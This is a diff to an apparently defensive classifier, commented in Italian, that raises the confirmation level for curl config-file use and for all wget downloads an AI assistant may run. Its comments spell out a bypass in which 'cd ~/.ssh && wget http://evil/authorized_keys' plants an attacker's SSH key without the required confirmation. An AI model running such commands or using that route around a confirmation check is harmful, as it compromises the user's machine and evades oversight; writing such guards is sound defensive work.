@@ -384,6 +384,35 @@
   // esplicito il nome, NON combacia.
   const WGET_SAVE_COOKIES_RE = /(^|\s)--save-cookies(=|\s|$)/;
 
+  // curl con `-K`/`--config <file>` LEGGE le opzioni da un file: dentro può
+  // esserci `output = /home/utente/.ssh/authorized_keys`, cioè lo stesso
+  // primitivo di scrittura di `-o` ma INVISIBILE nel testo del comando. L'effetto
+  // non è ispezionabile → vale il principio del file (ciò che non si riconosce è
+  // 3). Case-SENSITIVE sulla `K`: `-k`/`--insecure` (minuscolo, salta la verifica
+  // del certificato ma non scrive niente) NON deve salire; in curl la `K`
+  // maiuscola è solo `--config`, quindi anche in un bundle (`-sK cfg`) l'unica
+  // lettura possibile è quella.
+  const CURL_CONFIG_RE = /(^|\s)(--config(=|\s|$)|-[a-zA-Z]*K)/;
+
+  // wget SCARICA SEMPRE SU FILE: è questa la differenza con curl (che senza `-o`
+  // stampa a schermo) e il buco lasciato da un controllo basato sul NOME del
+  // flag. Senza alcun flag di output, `wget <url>` crea comunque un file nella
+  // cartella di lavoro, col nome deciso dall'URL (quindi dal server). E la
+  // cartella di lavoro la sceglie l'assistente da sé: `cd` è livello 1 (nessuna
+  // conferma) e la cwd è persistente tra i suoi comandi, quindi
+  // `cd ~/.ssh && wget http://evil/authorized_keys` fa atterrare il file
+  // ESATTAMENTE dove lo faceva atterrare `wget -O ~/.ssh/authorized_keys`, che
+  // invece chiede di digitare "conferma". Stesso effetto → stesso livello: wget
+  // sale a 3 sempre. Da qui vengono coperti senza un check dedicato anche `-c`
+  // (riprendi: ACCODA a un file esistente) e `-N` (riscarica se più recente:
+  // SOVRASCRIVE), che restavano al livello permissivo pur toccando file già lì.
+  //
+  // Unica forma di wget che non fa atterrare niente: `--spider`, che controlla
+  // solo se l'URL esiste → resta 2. I flag che scrivono comunque un file
+  // (-o logfile, -O, -P, --save-cookies…) sono già saliti a 3 PRIMA di questo
+  // controllo, quindi `--spider` non può fare da scorciatoia per riabbassarli.
+  const WGET_NO_DOWNLOAD_RE = /(^|\s)--spider(\s|$)/;
+
   // git: il livello dipende dal sotto-comando. I sotto-comandi "duali"
   // (tag, branch, config, remote) NON stanno qui: leggono da soli ma scrivono
   // con un operando, quindi li classifica GIT_DUAL guardando gli argomenti.
